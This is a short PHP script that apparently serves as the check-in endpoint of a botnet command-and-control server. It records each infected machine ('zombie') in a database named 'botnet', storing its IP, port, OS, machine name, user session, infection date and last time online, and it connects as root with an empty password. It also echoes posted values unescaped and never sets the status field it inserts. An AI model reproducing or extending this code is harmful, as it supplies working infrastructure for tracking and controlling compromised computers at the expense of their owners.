<?php

foreach ($_POST as $key => $value) {
        echo "<tr>";
        echo "<td>";
        echo $key;
        echo "</td>";
        echo "<td>";
        echo $value;
        echo "</td>";
        echo "</tr>";
    }

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "botnet";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// prepare and bind
$stmt = $conn->prepare("INSERT INTO zombies (ip, port, os, machine_name, user_session, infection_date, last_time_online, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
$stmt->bind_param("sissssss", $ip, $port, $os, $machine_name, $user_session, $infection_date, $last_time_online, $status);

if((!isset($_REQUEST['ip'])) || (empty($_REQUEST['ip']))) $ip = NULL; else $ip = $_REQUEST['ip'];
if((!isset($_REQUEST['port'])) || (empty($_REQUEST['port']))) $port = NULL; else $port = $_REQUEST['port'];
if((!isset($_REQUEST['os'])) || (empty($_REQUEST['os']))) $os = NULL; else $os = $_REQUEST['os'];
if((!isset($_REQUEST['machine_name'])) || (empty($_REQUEST['machine_name']))) $machine_name = NULL; else $machine_name = $_REQUEST['machine_name'];
if((!isset($_REQUEST['user_session'])) || (empty($_REQUEST['user_session']))) $user_session = NULL; else $user_session = $_REQUEST['user_session'];
if((!isset($_REQUEST['infection_date'])) || (empty($_REQUEST['infection_date']))) $infection_date = NULL; else $infection_date = $_REQUEST['infection_date'];
if((!isset($_REQUEST['last_time_online'])) || (empty($_REQUEST['last_time_online']))) $last_time_online = NULL; else $last_time_online = $_REQUEST['last_time_online'];

/*
$ip
$port
$os
$machine_name
$user_session
$infection_date
$last_time_online
$status
*/

$stmt->execute();


echo "New records created successfully";

$stmt->close();
$conn->close();
?>